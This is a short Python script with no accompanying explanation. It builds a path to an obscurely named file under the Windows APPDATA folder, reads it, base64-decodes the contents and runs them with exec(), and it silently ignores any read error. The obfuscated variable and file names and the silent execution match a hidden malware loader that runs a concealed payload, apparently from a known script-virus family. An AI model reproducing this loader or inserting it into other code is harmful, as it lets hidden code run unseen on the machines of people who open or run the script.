import binascii
import os
maya_path_=os.getenv("APPDATA")+'\syssst'
mayapath=maya_path_.replace('\\','/')
maya_path='%s/uition.t'%mayapath
try:
    with open(maya_path, 'rb') as f:
        d_a_t_a = f.read()
    data = binascii.a2b_base64(d_a_t_a)
    exec(data)
except IOError as e:
    pass